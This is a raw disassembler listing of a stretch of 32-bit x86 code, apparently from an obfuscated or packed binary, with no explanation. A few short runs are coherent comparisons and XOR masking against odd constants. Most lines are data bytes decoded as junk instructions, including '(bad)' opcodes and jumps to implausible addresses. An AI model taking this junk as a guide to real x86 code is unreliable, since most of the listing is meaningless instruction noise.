  41ab28:	mov    ebx,DWORD PTR [esp+0x54]
  41ab2c:	add    eax,ecx
  41ab2e:	mov    ecx,DWORD PTR [esp+0x88]
  41ab35:	adc    edx,ebx
  41ab37:	mov    ebx,DWORD PTR [esp+0x8c]
  41ab3e:	cmp    ecx,eax
  41ab40:	jne    0x41af1d
  41ab46:	cmp    ebx,edx
  41ab48:	jmp    0x41af17
  41ab4d:	xchg   esi,eax
  41ab4e:	loope  0x41ab41
  41ab50:	gs pop esi
  41ab52:	fs jp  0x41ab2f
  41ab55:	aam    0x4d
  41ab57:	imul   esi,DWORD PTR [eax+0x7c7325ee],0x72
  41ab5e:	lahf   
  41ab5f:	push   ss
  41ab60:	sbb    BYTE PTR [edx+edx*1+0x2d261818],bh
  41ab67:	sbb    esi,0xffffffd5
  41ab6a:	aad    0x8a
  41ab6c:	xor    al,0x8e
  41ab6e:	pusha  
  41ab6f:	test   eax,0x9f4a062c
  41ab74:	jp     0x41abee
  41ab76:	xor    DWORD PTR [ebp+0x7e4a73b5],esp
  41ab7c:	lods   eax,DWORD PTR ds:[esi]
  41ab7d:	ins    DWORD PTR es:[edi],dx
  41ab7e:	cwde   
  41ab7f:	js     0x41abaf
  41ab81:	jmp    0x4ed7f75
  41ab86:	lahf   
  41ab87:	jbe    0x41ab2b
  41ab89:	mov    eax,0xc1b8f6ec
  41ab8e:	and    eax,DWORD PTR [edx]
  41ab90:	(bad)  
  41ab92:	add    bl,dl
  41ab94:	lea    esp,[esi+eiz*8-0x1ab49a1]
  41ab9b:	sub    BYTE PTR [esi],bh
  41ab9d:	dec    DWORD PTR [eax-0x73]
  41aba0:	daa    
  41aba1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41aba2:	dec    esi
  41aba3:	cmp    al,BYTE PTR [edx+edx*2+0x74]
  41aba7:	pop    ss
  41aba8:	xchg   esp,eax
  41aba9:	xlat   BYTE PTR ds:[ebx]
  41abaa:	add    BYTE PTR [ebx+0x52370c58],ah
  41abb0:	dec    edi
  41abb1:	sbb    eax,0x6fe905db
  41abb6:	add    eax,0xb11a4b15
  41abbb:	add    DWORD PTR [ebx],esi
  41abbd:	ficomp DWORD PTR [edi+0x45]
  41abc0:	push   ebx
  41abc1:	js     0x41ac3e
  41abc3:	mov    DWORD PTR [ecx+eiz*1],edx
  41abc6:	adc    BYTE PTR [ebx+0x7270bdc],0xfb
  41abcd:	loope  0x41ab79
  41abcf:	scas   eax,DWORD PTR es:[edi]
  41abd0:	popa   
  41abd1:	gs dec esi
  41abd3:	cmp    BYTE PTR [eax],ch
  41abd5:	cwde   
  41abd6:	loop   0x41ac44
  41abd8:	jns    0x41abc2
  41abda:	push   0x5f
  41abdc:	and    cl,BYTE PTR [ebp*4-0x5f65ad10]
  41abe3:	(bad)  
  41abe4:	push   edx
  41abe5:	mov    dl,0xdc
  41abe7:	sub    cl,BYTE PTR [edi]
  41abe9:	mov    ebp,0x815d540
  41abee:	mov    ecx,0x8701d761
  41abf3:	loopne 0x41ac55
  41abf5:	or     al,0x14
  41abf7:	jge    0x41ac5e
  41abf9:	popf   
  41abfa:	(bad)  
  41abfb:	bnd jne 0x41ab98
  41abfe:	and    ebx,DWORD PTR [bx+si+0x4d]
  41ac02:	je     0x41aba3
  41ac04:	in     al,0x8c
  41ac06:	in     al,dx
  41ac07:	rol    dh,1
  41ac09:	xchg   ebx,ebx
  41ac0b:	and    ah,BYTE PTR [esi*2-0x4b85f683]
  41ac12:	hlt    
  41ac13:	cmp    DWORD PTR [ebx-0x21],eax
  41ac16:	(bad)  
  41ac17:	neg    edx
  41ac19:	jns    0x41ac30
  41ac1b:	bsr    esi,DWORD PTR [ebx]
  41ac1e:	mov    BYTE PTR [esi+0x3b],bh
  41ac21:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ac22:	mov    bh,0x20
  41ac24:	fisub  DWORD PTR [edx]
  41ac26:	jl     0x41ac09
  41ac28:	daa    
  41ac29:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ac2a:	in     eax,0xf2
  41ac2c:	js     0x41abaf
  41ac2e:	fwait
  41ac2f:	ds out 0x10,al
  41ac32:	fimul  WORD PTR [ebp-0x79]
  41ac35:	jp     0x41ac26
  41ac37:	jnp    0x41abbe
  41ac39:	test   al,0xd
  41ac3b:	(bad)  
  41ac3c:	(bad)  
  41ac3d:	test   eax,0x53e9589
  41ac42:	repz arpl WORD PTR cs:[ebx+ebp*2+0x28be55f1],si
  41ac4b:	ss jae 0x41abd5
  41ac4e:	sbb    BYTE PTR [ebp-0x6e],0x20
  41ac52:	ja     0x41ac96
  41ac54:	mov    DWORD PTR [edx+0xb],esi
  41ac57:	mov    ebp,0x4830cea
  41ac5c:	ret    
  41ac5d:	aam    0xcb
  41ac5f:	mov    dh,0x50
  41ac61:	mov    eax,ds:0xca2ed5fa
  41ac66:	cmp    bh,BYTE PTR [ecx]
  41ac68:	jno    0x41acd6
  41ac6a:	xchg   esp,eax
  41ac6b:	xlat   BYTE PTR ds:[ebx]
  41ac6c:	inc    edi
  41ac6d:	sub    BYTE PTR [ebx],bh
  41ac6f:	add    esp,ebp
  41ac71:	xor    edi,DWORD PTR [esi-0x14]
  41ac74:	les    edi,FWORD PTR [ebp+0xf5cecd6]
  41ac7a:	cmc    
  41ac7b:	lea    esi,es:[edi+0xf06cb00]
  41ac82:	mov    al,ds:0x1aa9dbe6
  41ac87:	push   ecx
  41ac88:	sbb    DWORD PTR [ebx],ebp
  41ac8a:	fs cmp cl,bh
  41ac8d:	ret    
  41ac8e:	jle    0x41ac8a
  41ac90:	pop    ecx
  41ac91:	add    DWORD PTR [ebx+0x4d],ebx
  41ac94:	scas   al,BYTE PTR es:[edi]
  41ac95:	mov    WORD PTR [ecx+0x2da6c3b],gs
  41ac9b:	cmp    al,0x52
  41ac9d:	add    DWORD PTR [ebx+0x24],ecx
  41aca0:	retf   0x4be0
  41aca3:	inc    edi
  41aca4:	and    bl,cl
  41aca6:	ror    DWORD PTR ss:[ecx-0x55954689],1
  41acad:	cmc    
  41acae:	adc    DWORD PTR [ebp+0x5d1dd477],0x93502739
  41acb8:	dec    esi
  41acb9:	aad    0x51
  41acbb:	push   ebp
  41acbc:	test   eax,0x113d12b5
  41acc1:	fwait
  41acc2:	(bad)  
  41acc4:	sbb    al,0xf7
  41acc6:	xor    al,0x90
  41acc8:	jnp    0x41acbe
  41acca:	mov    ah,0x0
  41accc:	push   ecx
  41accd:	cmp    bh,BYTE PTR [ebx]
  41accf:	push   es
  41acd0:	addr16 xchg edx,eax
  41acd2:	add    BYTE PTR [ebx-0x3ac4131d],ch
  41acd8:	and    BYTE PTR [eax+0xb315e53],cl
  41acde:	hlt    
  41acdf:	ins    DWORD PTR es:[edi],dx
  41ace0:	mov    ebx,0xe4f86afd
  41ace5:	inc    esp
  41ace6:	pop    edi
  41ace7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ace8:	mov    esi,0x8f4d0968
  41aced:	hlt    
  41acee:	cld    
  41acef:	in     eax,0x41
  41acf1:	pop    ebx
  41acf2:	hlt    
  41acf3:	int    0xd3
  41acf5:	test   edi,esp
  41acf7:	fmul   DWORD PTR [eax+eiz*1]
  41acfa:	xor    eax,0x1722bb82
  41acff:	xchg   ebp,eax
  41ad00:	int3   
  41ad01:	lds    edx,FWORD PTR ds:0x6633f5f2
  41ad07:	adc    DWORD PTR [esi+ebx*4-0x61f8b884],0x9
  41ad0f:	mov    eax,ds:0x6f6dd3c8
  41ad14:	sbb    bl,BYTE PTR [edx-0x64cfa463]
  41ad1a:	xlat   BYTE PTR ds:[ebx]
  41ad1b:	push   cs
  41ad1c:	arpl   WORD PTR [ebx],dx
  41ad1e:	sbb    eax,0xdcd760a
  41ad23:	aas    
  41ad24:	pop    eax
  41ad25:	jecxz  0x41acd6
  41ad27:	je     0x41acf0
  41ad29:	push   es
  41ad2a:	(bad)  
  41ad2b:	psadbw mm5,QWORD PTR [eax+edx*1-0x2e]
  41ad30:	fisub  WORD PTR [ebx-0x2abf28f]
  41ad36:	inc    DWORD PTR [ebx]
  41ad38:	mov    esi,0x9853e556
  41ad3d:	inc    eax
  41ad3e:	clc    
  41ad3f:	xor    ecx,DWORD PTR [eax+0x64]
  41ad42:	or     al,0x5b
  41ad44:	retf   
  41ad45:	test   BYTE PTR [ebp+ecx*1-0x13454e78],ch
  41ad4c:	pop    esi
  41ad4d:	subps  xmm5,XMMWORD PTR [ebp+esi*1-0x4f]
  41ad52:	mov    eax,ds:0x8e60bdc9
  41ad57:	repnz repnz fdivp st(3),st
  41ad5b:	loope  0x41ad54
  41ad5d:	push   es
  41ad5e:	and    ebp,0xd9dd5c0d
  41ad64:	out    dx,eax
  41ad65:	loopne 0x41ad6c
  41ad67:	aam    0xf2
  41ad69:	xor    eax,0x86033a13
  41ad6e:	aas    
  41ad6f:	mov    esp,0x30eb5bfe
  41ad74:	cdq    
  41ad75:	xor    al,0xd0
  41ad77:	fild   WORD PTR [edi+0x2d]
  41ad7a:	pop    ebx
  41ad7b:	jle    0x41add7
  41ad7d:	push   es
  41ad7e:	fadd   QWORD PTR [ebp-0xd]
  41ad81:	retf   0x3879
  41ad84:	xor    dh,al
  41ad86:	or     eax,0x87f05be9
  41ad8b:	add    DWORD PTR [ebx-0x62],ecx
  41ad8e:	mov    BYTE PTR [esi+0x4154089b],al
  41ad94:	shl    DWORD PTR [ecx],1
  41ad96:	retf   0xd251
  41ad99:	pop    ebp
  41ad9a:	pop    ebx
  41ad9b:	push   ss
  41ad9c:	(bad)  
  41ad9d:	xchg   ebx,eax
  41ad9e:	rcl    al,1
  41ada0:	pop    esp
  41ada1:	bound  edx,QWORD PTR ds:0xf29354eb
  41ada7:	(bad)  
  41ada8:	cmp    eax,0xa8a16834
  41adad:	inc    ecx
  41adae:	mov    ebx,DWORD PTR [edi]
  41adb0:	dec    eax
  41adb1:	add    DWORD PTR [ecx],esp
  41adb3:	mov    DWORD PTR [edi+esi*4],ebp
  41adb6:	push   ebp
  41adb7:	pushf  
  41adb8:	cmp    al,0xc4
  41adba:	in     al,0x41
  41adbc:	sub    ah,bl
  41adbe:	retf   0xcb71
  41adc1:	and    al,0xd8
  41adc3:	xchg   ebp,eax
  41adc4:	jo     0x41ad64
  41adc6:	mov    edi,ecx
  41adc8:	adc    eax,0xe56d9b90
  41adcd:	ja     0x41adb0
  41adcf:	sar    ecx,cl
  41add1:	aaa    
  41add2:	fadd   DWORD PTR [edi-0x44b91d40]
  41add8:	jge    0x41ade5
  41adda:	cdq    
  41addb:	rcl    DWORD PTR [edi],cl
  41addd:	lods   eax,DWORD PTR ds:[esi]
  41adde:	dec    esp
  41addf:	push   esi
  41ade0:	imul   ebx,DWORD PTR [edx-0x11],0x2b50cf74
  41ade7:	loopne 0x41ad82
  41ade9:	jmp    eax
  41adeb:	aam    0x71
  41aded:	sbb    BYTE PTR [edx-0x13],bh
  41adf0:	xchg   edx,eax
  41adf1:	and    BYTE PTR [ebx-0x1b767f24],dh
  41adf7:	std    
  41adf8:	ins    BYTE PTR es:[edi],dx
  41adf9:	jns    0x41ae0c
  41adfb:	adc    DWORD PTR [eax],eax
  41adfd:	push   esp
  41adfe:	rcr    BYTE PTR [ebp+0x6e],cl
  41ae01:	nop
  41ae02:	push   0x51d0f07a
  41ae07:	mov    esi,0xbda13586
  41ae0c:	cmp    ebp,DWORD PTR [esi-0x2a]
  41ae0f:	stos   DWORD PTR es:[edi],eax
  41ae10:	sbb    al,0xc9
  41ae12:	out    dx,al
  41ae13:	pusha  
  41ae14:	mov    esp,0x6b855768
  41ae19:	dec    edx
  41ae1a:	jl     0x41ae60
  41ae1c:	enter  0xcba3,0x1b
  41ae20:	sub    al,0xa2
  41ae22:	arpl   sp,bp
  41ae24:	imul   ebx,DWORD PTR [ecx-0x397528a0],0x1a
  41ae2b:	ror    BYTE PTR gs:[edx+0x1b],1
  41ae2f:	out    dx,eax
  41ae30:	push   0x22
  41ae32:	jmp    0x41ae74
  41ae34:	xchg   ebp,eax
  41ae35:	stc    
  41ae36:	arpl   WORD PTR [ecx+0x611a2429],di
  41ae3c:	out    dx,eax
  41ae3d:	dec    esp
  41ae3e:	xchg   ecx,eax
  41ae3f:	sti    
  41ae40:	retf   0xd121
  41ae43:	dec    edi
  41ae44:	gs mov eax,0x8a0dd04f
  41ae4a:	(bad)  
  41ae4b:	lods   eax,DWORD PTR ds:[esi]
  41ae4c:	add    BYTE PTR [eax],bh
  41ae4e:	sti    
  41ae4f:	inc    eax
  41ae50:	leave  
  41ae51:	mov    ebx,0x9b3c8618
  41ae56:	mov    esi,0xc29d556b
  41ae5b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ae5c:	jo     0x41aeb0
  41ae5e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ae5f:	aad    0xd9
  41ae61:	ins    BYTE PTR es:[edi],dx
  41ae62:	or     al,0x6c
  41ae64:	sti    
  41ae65:	xor    ch,dl
  41ae67:	mov    ?,esp
  41ae69:	adc    esi,edi
  41ae6b:	idiv   BYTE PTR [esi+0x5f]
  41ae6e:	mov    eax,ds:0x865da947
  41ae73:	ins    DWORD PTR es:[edi],dx
  41ae74:	cmp    BYTE PTR [edi+0x70],bh
  41ae77:	mov    ebp,0xf4b41b76
  41ae7c:	cwde   
  41ae7d:	(bad)  
  41ae7e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ae7f:	jne    0x41aedf
  41ae81:	in     al,0xd6
  41ae83:	fidiv  DWORD PTR [eax+0x7c59c936]
  41ae89:	outs   dx,BYTE PTR ds:[esi]
  41ae8a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ae8b:	in     al,dx
  41ae8c:	repnz stc 
  41ae8e:	pusha  
  41ae8f:	int3   
  41ae90:	cmp    edx,esp
  41ae92:	test   bh,0xbd
  41ae95:	jnp    0x41aece
  41ae97:	pop    ss
  41ae98:	ret    0x56b0
  41ae9b:	retf   0x860
  41ae9e:	sub    bl,dh
  41aea0:	sbb    eax,0x854e6255
  41aea5:	(bad)  
  41aea6:	not    BYTE PTR [eax+0x45]
  41aea9:	dec    eax
  41aeaa:	push   ebp
  41aeab:	inc    ebp
  41aeac:	jno    0x41ae88
  41aeae:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41aeaf:	(bad)  
  41aeb0:	frstor [edi-0x78]
  41aeb3:	dec    edx
  41aeb4:	pop    edi
  41aeb5:	loop   0x41af36
  41aeb7:	inc    edi
  41aeb8:	xor    ebx,DWORD PTR [ebx+0xacb0459]
  41aebe:	cdq    
  41aebf:	ret    0xf82f
  41aec2:	ja     0x41af32
  41aec4:	push   cs
  41aec5:	jecxz  0x41ae77
  41aec7:	xchg   BYTE PTR [esi],cl
  41aec9:	cdq    
  41aeca:	pop    esp
  41aecb:	not    DWORD PTR [edx+0x28]
  41aece:	jmp    0xa0ac0553
  41aed3:	jbe    0x41aef1
  41aed5:	xor    al,0x0
  41aed7:	xor    al,BYTE PTR [ebx+0x13]
  41aeda:	sub    al,0xb2
  41aedc:	xor    BYTE PTR [edx-0x2f34a91d],ch
  41aee2:	shl    BYTE PTR [ecx+ebp*8+0x2f],cl
  41aee6:	fisubr WORD PTR [eax+0x38]
  41aee9:	mov    ds:0xd02313b2,eax
  41aeee:	mov    al,ds:0x2e98afcd
  41aef3:	sub    al,BYTE PTR ds:0x1b86c224
  41aef9:	shl    DWORD PTR [ebp+edx*8-0x14],0x5
  41aefe:	sti    
  41aeff:	pop    edi
  41af00:	mov    eax,ds:0x8806d62d
  41af05:	into   
  41af06:	psraw  mm4,QWORD PTR [ebx-0x5718312d]
  41af0d:	out    0x12,al
  41af0f:	pop    eax
  41af10:	test   BYTE PTR [edi-0x5bcacd6d],0x30
  41af17:	je     0x41d921
  41af1d:	mov    eax,DWORD PTR [esp+0x40]
  41af21:	mov    edx,DWORD PTR [esp+0x18]
  41af25:	xor    ecx,ecx
  41af27:	shld   ecx,eax,0x2
  41af2b:	shl    eax,0x2
  41af2e:	mov    ebx,0xca79a575
  41af33:	mov    DWORD PTR [esp+0x10],edx
  41af37:	mov    edx,DWORD PTR [esp+0x1c]
  41af3b:	xor    eax,ebx
  41af3d:	xor    ecx,esi
  41af3f:	mov    DWORD PTR [esp+0x14],edx
  41af43:	cmp    eax,DWORD PTR [esp+0x10]
  41af47:	jne    0x41af55
  41af4d:	cmp    ecx,edx
  41af4f:	je     0x41d926
  41af55:	mov    eax,DWORD PTR [esp+0x44]
  41af59:	cmp    eax,0xa4069aaa
  41af5e:	je     0x41b750
  41af64:	mov    edx,DWORD PTR [esp+0x18]
  41af68:	mov    eax,DWORD PTR [esp+0x1c]
  41af6c:	xor    eax,esi
  41af6e:	jmp    0x41b33d
  41af73:	popa   
  41af74:	cmp    edx,ecx
  41af76:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41af77:	stos   DWORD PTR es:[edi],eax
  41af78:	and    bl,BYTE PTR [esi+0x3a]
  41af7b:	ins    DWORD PTR es:[edi],dx
  41af7c:	jnp    0x41af01
  41af7e:	jl     0x41aff8
  41af80:	pop    ebp
  41af81:	jne    0x41afff
  41af83:	pop    ss
  41af84:	xchg   edi,eax
  41af85:	push   ss
  41af86:	sbb    BYTE PTR [edx+edx*1+0x4e3e1818],bh
  41af8d:	jnp    0x41af6d
  41af8f:	(bad)
  41af93:	mov    cl,0x2c
  41af95:	lock lods al,BYTE PTR ds:[esi]
  41af97:	mov    al,ds:0x38581ebf
  41af9c:	pop    ebx
  41af9d:	test   DWORD PTR [eax+ebp*2],esi
  41afa0:	in     al,0x67
  41afa2:	test   al,0x7b
  41afa4:	xchg   ecx,eax
  41afa5:	sub    dl,BYTE PTR ds:0xa5e15f87
  41afab:	bound  edi,QWORD PTR [edi+0xd]
  41afae:	pop    ecx
  41afaf:	loopne 0x41afd5
  41afb1:	data16 jle 0x41af7b
  41afb4:	ffree  st(1)
  41afb6:	adc    eax,0x6cc63d22
  41afbb:	fs jo  0x41afe1
  41afbe:	xor    DWORD PTR [edi+0x24],ecx
  41afc1:	test   BYTE PTR [ebp-0x69],bh
  41afc4:	pop    ecx
  41afc5:	push   ebx
  41afc6:	or     ah,BYTE PTR [ecx-0x6910fe9c]
  41afcc:	sbb    DWORD PTR [ecx-0x36c93b21],edx
  41afd2:	dec    edi
  41afd3:	sbb    edx,eax
  41afd5:	sbb    edx,DWORD PTR [ecx-0x10]
  41afd8:	push   0x1b
  41afda:	jb     0x41aff7
  41afdc:	mov    ds:0xe8d05afe,al
  41afe1:	std    
  41afe2:	bound  ebx,QWORD PTR [ecx+0x6e]
  41afe5:	adc    al,0x71
  41afe7:	fs dec eax
  41afe9:	les    eax,FWORD PTR [esi]
  41afeb:	pop    edi
  41afec:	sub    BYTE PTR [esi-0x3a],bh
  41afef:	mov    DWORD PTR [edi],edi
  41aff1:	push   ds
  41aff2:	jmp    0xe435:0x747c1e09
  41aff9:	iret   
  41affa:	xor    ah,BYTE PTR [ecx-0x78]
  41affd:	jo     0x41b01e
  41afff:	inc    DWORD PTR [edi-0x7e3fe937]
  41b005:	sbb    eax,0xbf9f0263
  41b00a:	xor    ebx,ebx
  41b00c:	(bad)  
  41b00d:	dec    BYTE PTR [ebx]
  41b00f:	inc    eax
  41b010:	pop    ebx
  41b011:	or     DWORD PTR [ebp+0x1aabe746],ebx
  41b017:	xor    eax,0x8a1b16c4
  41b01c:	loopne 0x41afe2
  41b01e:	cli    
  41b01f:	outs   dx,BYTE PTR ds:[esi]
  41b020:	pop    eax
  41b021:	push   ecx
  41b022:	loope  0x41b005
  41b024:	(bad)  
  41b026:	ret    0x70f9
  41b029:	jecxz  0x41b03f
  41b02b:	scas   eax,DWORD PTR es:[edi]
  41b02c:	and    ebx,DWORD PTR [edx-0x593bf133]
  41b032:	push   edi
  41b033:	adc    cl,ch
  41b035:	out    0x1,eax
  41b037:	out    dx,eax
  41b038:	jp     0x41b00c
  41b03a:	sbb    dl,dl
  41b03c:	jle    0x41b04e
  41b03e:	lahf   
  41b03f:	push   ebp
  41b040:	mov    WORD PTR ds:0xe152cdea,fs
  41b046:	mov    DWORD PTR [ebx-0x2b71d483],esi
  41b04c:	jg     0x41b07d
  41b04e:	mov    ebx,0x85d5ffe2
  41b053:	xchg   ecx,eax
  41b054:	lods   al,BYTE PTR ds:[esi]
  41b055:	or     BYTE PTR [esi+edx*8+0x12],ch
  41b059:	mov    esi,0x39fbb838
  41b05e:	jmp    0x4b83d838
  41b063:	cmp    BYTE PTR [esi],al
  41b065:	int    0x24
  41b067:	push   ebp
  41b068:	mov    WORD PTR gs:[ecx+0x3d906cb0],cs
  41b06f:	enter  0x2115,0xdc
  41b073:	jno    0x41b0d9
  41b075:	lahf   
  41b076:	in     al,dx
  41b077:	inc    ebp
  41b078:	sar    esp,cl
  41b07a:	daa    
  41b07b:	sar    ch,cl
  41b07d:	stc    
  41b07e:	ja     0x41b03a
  41b080:	mov    BYTE PTR [esi+0x6896a0ff],cl
  41b086:	loopne 0x41b0a6
  41b088:	aam    0x1f
  41b08a:	jb     0x41b039
  41b08c:	sub    bl,BYTE PTR [ebx-0x12571940]
  41b092:	cli    
  41b093:	sbb    eax,0x9da6fbc4
  41b098:	addr16 mov edx,0x68f5452e
  41b09e:	aam    0xd7
  41b0a0:	jle    0x41b118
  41b0a2:	(bad)  ds:0x50de5b6f
  41b0a8:	shl    bl,1
  41b0aa:	adc    DWORD PTR [ebx+0x592a85fb],0x39
  41b0b1:	pop    es
  41b0b2:	push   eax
  41b0b3:	ss int3 
  41b0b5:	aad    0x77
  41b0b7:	dec    ebp
  41b0b8:	call   0x6233c3fe
  41b0bd:	jge    0x41b0df
  41b0bf:	sbb    al,0xe0
  41b0c1:	dec    edx
  41b0c2:	and    bh,ah
  41b0c4:	jl     0x41b12d
  41b0c6:	iret   
  41b0c7:	inc    eax
  41b0c8:	out    0x45,al
  41b0ca:	(bad)  
  41b0cc:	mov    ah,BYTE PTR [edi+0x54]
  41b0cf:	scas   al,BYTE PTR es:[edi]
  41b0d0:	dec    ebp
  41b0d1:	push   esi
  41b0d2:	dec    eax
  41b0d3:	je     0x41b0bb
  41b0d5:	mov    edi,0x92fb34bc
  41b0da:	or     al,0x97
  41b0dc:	fst    st(5)
  41b0de:	je     0x41b15f
  41b0e0:	mov    al,ds:0x1a0a15ed
  41b0e5:	xchg   edi,eax
  41b0e6:	aam    0x5b
  41b0e8:	ds pop eax
  41b0ea:	aam    0x12
  41b0ec:	or     ecx,ebx
  41b0ee:	enter  0x1a37,0x8d
  41b0f2:	cmp    BYTE PTR [eax],ch
  41b0f4:	jecxz  0x41b161
  41b0f6:	pop    ds
  41b0f7:	in     al,dx
  41b0f8:	cmovns edx,DWORD PTR [edx-0x37]
  41b0fc:	xchg   esp,eax
  41b0fd:	inc    edi
  41b0fe:	and    eax,0x5f712f0c
  41b103:	mov    eax,0xb79c45dd
  41b108:	std    
  41b109:	rol    DWORD PTR [ecx+0x1e],1
  41b10c:	mov    ebp,DWORD PTR [edx]
  41b10e:	pop    eax
  41b10f:	in     eax,0x2
  41b111:	scas   al,BYTE PTR es:[edi]
  41b112:	dec    ebx
  41b113:	dec    esp
  41b114:	mov    ds:0xb35eaa8,eax
  41b119:	sub    ch,BYTE PTR [eax+0x77]
  41b11c:	test   al,bh
  41b11e:	and    eax,0xa9ed7171
  41b123:	xchg   ebp,eax
  41b124:	rcr    BYTE PTR [edi],0xbe
  41b127:	es sub al,0xcb
  41b12a:	repz pop edi
  41b12c:	int3   
  41b12d:	pop    ecx
  41b12e:	mov    WORD PTR [edx-0x5f],ds
  41b131:	jp     0x41b112
  41b133:	push   es
  41b134:	gs pushf 
  41b136:	daa    
  41b137:	(bad)  
  41b138:	push   ecx
  41b139:	mov    eax,0x5b8af973
  41b13e:	pusha  
  41b13f:	imul   ebp,DWORD PTR [esi+0x689513f6],0xe8f0b4ad
  41b149:	push   0x198e2ce7
  41b14e:	mov    esp,0xb20ca003
  41b153:	push   ds
  41b154:	push   ecx
  41b155:	sub    bh,BYTE PTR [ebx]
  41b157:	or     dl,al
  41b159:	pop    edi
  41b15a:	lods   al,BYTE PTR ds:[esi]
  41b15b:	dec    ebx
  41b15c:	inc    ecx
  41b15d:	cmp    bl,BYTE PTR [esi]
  41b15f:	repnz jecxz 0x41b140
  41b162:	pop    ecx
  41b163:	in     al,0x7f
  41b165:	push   ecx
  41b166:	lea    eax,[ecx+0x23]
  41b169:	sbb    dl,BYTE PTR [ebx]
  41b16b:	retf   0x6a3e
  41b16e:	sub    ecx,0xf0beef66
  41b174:	enter  0x44f8,0x63
  41b178:	stos   DWORD PTR es:[edi],eax
  41b179:	dec    edx
  41b17a:	or     DWORD PTR [edx],esp
  41b17c:	jno    0x41b196
  41b17e:	adc    al,0xba
  41b180:	fistp  QWORD PTR [ebp-0x319c876b]
  41b186:	cmp    ecx,eax
  41b188:	ins    BYTE PTR es:[edi],dx
  41b189:	test   dl,ah
  41b18b:	std    
  41b18c:	inc    edi
  41b18d:	fs inc edi
  41b18f:	jle    0x41b16f
  41b191:	shl    BYTE PTR [edx+ebp*1+0x27369fb6],1
  41b198:	int3   
  41b199:	or     DWORD PTR [esi+eiz*4+0x79f4d7e8],ebx
  41b1a0:	jnp    0x41b183
  41b1a2:	mov    esi,0x3564d1d9
  41b1a7:	das    
  41b1a8:	shr    BYTE PTR [edi+ecx*8],cl
  41b1ab:	stos   DWORD PTR es:[edi],eax
  41b1ac:	ins    BYTE PTR es:[edi],dx
  41b1ad:	mov    edi,0xe41eb5ad
  41b1b2:	xchg   BYTE PTR [ebx],bl
  41b1b4:	test   DWORD PTR [esi+0x73],edi
  41b1b7:	neg    DWORD PTR [ebp+0x6d]
  41b1ba:	mov    ah,0x25
  41b1bc:	add    ch,BYTE PTR [ebp+0x4c55ce8c]
  41b1c2:	scas   eax,DWORD PTR es:[edi]
  41b1c3:	mov    dh,ah
  41b1c5:	call   0x2ca3:0xbd5366ea
  41b1cc:	dec    esp
  41b1cd:	fwait
  41b1ce:	xor    edi,edi
  41b1d0:	adc    ch,BYTE PTR es:[edx-0x334b482f]
  41b1d7:	bnd jl 0x41b199
  41b1da:	inc    edi
  41b1db:	aas    
  41b1dc:	xchg   esi,eax
  41b1dd:	cli    
  41b1de:	xchg   esi,eax
  41b1df:	test   eax,0x6ee5493
  41b1e4:	ins    DWORD PTR es:[edi],dx
  41b1e5:	adc    BYTE PTR [eax+0xa2dbc0a],bl
  41b1eb:	and    cl,al
  41b1ed:	add    DWORD PTR [esi],edi
  41b1ef:	sub    al,0x2f
  41b1f1:	jge    0x41b1b0
  41b1f3:	jle    0x41b19f
  41b1f5:	outs   dx,WORD PTR ds:[esi]
  41b1f7:	push   ss
  41b1f8:	xchg   edx,eax
  41b1f9:	pushf  
  41b1fa:	out    dx,eax
  41b1fb:	adc    esi,ebp
  41b1fd:	in     eax,0x8f
  41b1ff:	dec    esp
  41b200:	mov    ds:0x3e4f8546,al
  41b205:	lahf   
  41b206:	(bad)  
  41b207:	jae    0x41b227
  41b209:	jle    0x41b19a
  41b20b:	enter  0x28a2,0xd
  41b20f:	mov    edi,DWORD PTR [edi-0xd]
  41b212:	popa   
  41b213:	imul   eax,ebx,0x72
  41b216:	mov    BYTE PTR [esi],ah
  41b218:	ja     0x41b263
  41b21a:	cmp    al,0x3f
  41b21c:	leave  
  41b21d:	je     0x41b1bb
  41b21f:	fidivr DWORD PTR [edi+0x62]
  41b222:	ror    DWORD PTR [ebx-0x70fdbab1],0xd3
  41b229:	fst    QWORD PTR [edx]
  41b22b:	mov    dl,0x7c
  41b22d:	adc    eax,0x94ab6174
  41b232:	mov    eax,ds:0x441a5640
  41b237:	cmp    ecx,DWORD PTR [ebx-0x111040c5]
  41b23d:	cld    
  41b23e:	xchg   DWORD PTR [esi-0x4c],esp
  41b241:	fwait
  41b242:	into   
  41b243:	adc    ebp,DWORD PTR [edi-0x22b22450]
  41b249:	gs fcmovnu st,st(7)
  41b24c:	int    0x2b
  41b24e:	sub    DWORD PTR [ebp+esi*4+0x34],0xe
  41b253:	pop    ebx
  41b254:	popa   
  41b255:	mov    ds:0x3c27fec2,al
  41b25a:	arpl   dx,si
  41b25c:	jmp    0x9508:0x95485b50
  41b263:	repz mov ds:0x627ba4ef,al
  41b269:	push   cs
  41b26a:	stc    
  41b26b:	pop    ss
  41b26c:	push   0xbbfd05c7
  41b271:	mov    edx,0x9a98e779
  41b276:	sahf   
  41b277:	mov    dh,0x6b
  41b279:	retf   
  41b27a:	jmp    0x20dc:0x62d7dfbe
  41b281:	mov    ?,WORD PTR [eax]
  41b283:	pusha  
  41b284:	test   DWORD PTR [esi],edx
  41b286:	xchg   edx,eax
  41b287:	pop    ss
  41b288:	push   ss
  41b289:	jns    0x41b2c1
  41b28b:	aad    0xc6
  41b28d:	ds mov esp,0x58514568
  41b293:	neg    DWORD PTR [ebx]
  41b295:	add    eax,0xc35e68c8
  41b29a:	ror    DWORD PTR [edx-0x55],cl
  41b29d:	call   0x682f:0xf550d47
  41b2a4:	jge    0x41b2a3
  41b2a6:	fldenv [edx]
  41b2a8:	imul   esp,DWORD PTR [ebx],0xb
  41b2ab:	mov    esp,ss
  41b2ad:	or     esp,ebx
  41b2af:	js     0x41b2f5
  41b2b1:	inc    ecx
  41b2b2:	xchg   ebx,eax
  41b2b3:	addr16 push esi
  41b2b5:	cmovo  esi,DWORD PTR [edi]
  41b2b8:	in     al,0x33
  41b2ba:	mov    dl,0x69
  41b2bc:	das    
  41b2bd:	mov    dh,BYTE PTR gs:[edi+eiz*2]
  41b2c1:	fwait
